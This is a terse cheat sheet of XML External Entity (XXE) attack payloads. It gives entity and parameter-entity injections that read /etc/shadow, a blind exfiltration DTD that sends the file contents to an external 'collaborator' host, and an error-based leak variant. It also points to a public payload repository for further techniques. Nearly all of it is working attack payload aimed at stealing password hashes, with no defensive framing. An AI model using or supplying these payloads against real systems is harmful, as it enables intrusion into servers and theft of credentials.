----xxe----
1.general entity/blind for collaborator
   <!DOCTYPE root[<!ENTITY xxe SYSTEM/PUBLIC 'burp-collaborator/file:///etc/shadow'>]>
   &xxe;
2.parameter entity/blind for
   <!DOCTYPE root[<!ENTITY % xxe SYSTEM 'file:///etc/shadow'>%xxe;]> 
3.dtd
   --store this payload website--
   I.exfiltrate
   <!ENTITY % xxe SYSTEM 'file:///etc/shadow'>
   <!ENTITY % name "<!ENTITY % name2 SYSTEM 'http://collaborator/?n=/%xxe;'>">
   %name;
   %name2;

   II.error message
   <!ENTITY % xxe SYSTEM 'file:///etc/shadow'>
   <!ENTITY % name "<!ENTITY % name2 SYSTEM 'file://error/%xxe;'>">
   %name;
   %name2
4.local dtd  payloadsallthings
5.svg file payloadsallthings
6.xinclude payloadsallthings